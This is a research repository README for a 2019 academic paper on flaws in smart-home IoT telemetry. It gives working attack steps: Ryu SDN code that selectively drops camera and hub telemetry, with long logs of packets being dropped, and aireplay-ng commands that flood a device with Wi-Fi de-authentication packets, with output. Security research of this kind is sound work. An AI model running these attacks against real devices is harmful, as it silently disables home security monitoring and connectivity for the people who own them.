# Blinded and Confused

The repository contains the source code for attacks described our paper "Blinded and Confused: Uncovering Systemic Flaws in Device Telemetry for Smart-Home Internet of Things" [bib](wisec2019oconnor1.bib),[pdf](wisec2019oconnor1.pdf)

## Requirements

This attack uses a RYU software defined network application. For more on how we forwarded, our LinkSys router traffic to the application, see https://github.com/tj-oconnor/WRT1900-OVS

## Setting Up The Network Layer Attack

Place the device name and IP address youd like to attack in config.py

```
GEENIE = '10.10.4.123'
IRIS = '10.10.4.122'
```

Append those youd like to attack to LOGLIST. As the attack logging produces a great deal of output, its encouraged to only attack one device at a time or suppress the output.
```
LOGLIST = []
LOGLIST.append(GEENIE)
LOGLIST.append(IRIS)
```

The attack for each device is in ryu_telem.py

```
elif (i.src==GEENIE):
        self.pretty_print_pkt('GEENIE-CAMERA',i,pkt_tcp)
        if pkt_tcp.dst_port==1883 and "smart/device/out" in str(pkt.protocols[-1]):
            self.warning_msg('GEENIE-CAMERA',i,pkt_tcp,'[!] Dropping MQQT Telemetry')
            return

elif (i.src==IRIS):
        self.pretty_print_pkt('IRIS-HUB',i,pkt_tcp)
        if (pkt_tcp.bits==24 and pkt_tcp.dst_port==443 and i.total_length > 250):
            self.warning_msg('IRIS-HUB',i,pkt_tcp,'[!] Dropping IRIS Telemetry Data (PSH|ACK)')
            return
```

Start the appilcation and observe it blocking traffic
```
[IRIS-HUB]      [2018-12-09 15:35:00.248812]    52398->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:05.187632]    52398->13.68.117.58 : 443//109//24
[IRIS-HUB]      [2018-12-09 15:35:05.258523]    52398->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:10.188028]    52398->13.68.117.58 : 443//109//24
[IRIS-HUB]      [2018-12-09 15:35:10.256607]    52398->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:15.191510]    52398->13.68.117.58 : 443//109//24
[IRIS-HUB]      [2018-12-09 15:35:15.263381]    52398->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:17.161423]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:17.161602]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:17.416555]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:17.416804]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:17.676887]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:17.677133]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:18.197236]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:18.197485]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:19.237128]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:19.237379]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:21.317041]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:21.317296]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:25.486755]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:25.487121]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:33.826669]    52398->13.68.117.58 : 443//445//24
[IRIS-HUB]  [2018-12-09 15:35:33.826920]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    52398->13.68.117.58 : 443//445
[IRIS-HUB]      [2018-12-09 15:35:35.194913]    52398->13.68.117.58 : 443//40//20
[IRIS-HUB]      [2018-12-09 15:35:35.252784]    52398->13.68.117.58 : 443//40//4
[IRIS-HUB]      [2018-12-09 15:35:35.552013]    47072->13.68.117.58 : 443//60//2
[IRIS-HUB]      [2018-12-09 15:35:35.618651]    47072->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:35.624799]    47072->13.68.117.58 : 443//204//24
[IRIS-HUB]      [2018-12-09 15:35:35.715282]    47072->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:35.717945]    47072->13.68.117.58 : 443//40//16
[IRIS-HUB]      [2018-12-09 15:35:36.117086]    47072->13.68.117.58 : 443//1480//16
[IRIS-HUB]      [2018-12-09 15:35:36.120049]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:36.120408]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:36.496680]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:36.496920]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:36.776859]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:36.777102]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:37.336644]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:37.336885]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:38.457123]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:38.457366]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:40.696368]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:40.696613]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
[IRIS-HUB]      [2018-12-09 15:35:45.186865]    47072->13.68.117.58 : 443//1109//24
[IRIS-HUB]  [2018-12-09 15:35:45.187204]    [Action: [!] Dropping IRIS Telemetry Data (PSH|ACK)]    47072->13.68.117.58 : 443//1109
```

## Setting Up The Physical Layer Attack

Place your wireless adapater in promiscous mode using airmon-ng
```
$ airmon-ng start wlan0 11
PHY Interface   Driver      Chipset
phy0    wlan0mon    rt2800usb   Hawking Technologies HAWNU1 Hi-Gain Wireless-150N Network Adapter with Range Amplifier [Ralink RT3070]
```

Forge de-auth packets using the aireplay-ng toolkit. 
```
$ aireplay-ng -0 1000000 -a 00:50:43:CC:DD:EE-c e0:4f:43:AA:BB:CC wlan0mon
17:15:45  Waiting for beacon frame (BSSID: 00:50:43:CC:DD:EE) on channel 11
17:15:45  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [74|64 ACKs]
17:15:46  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [12|64 ACKs]
17:15:46  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [46|61 ACKs]
17:15:47  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [23|64 ACKs]
17:15:47  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [25|63 ACKs]
17:15:48  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [25|61 ACKs]
17:15:49  Sending 64 directed DeAuth (code 7). STMAC: [E0:4F:43:AA:BB:CC] [24|62 ACKs]
<..snipped..>
```

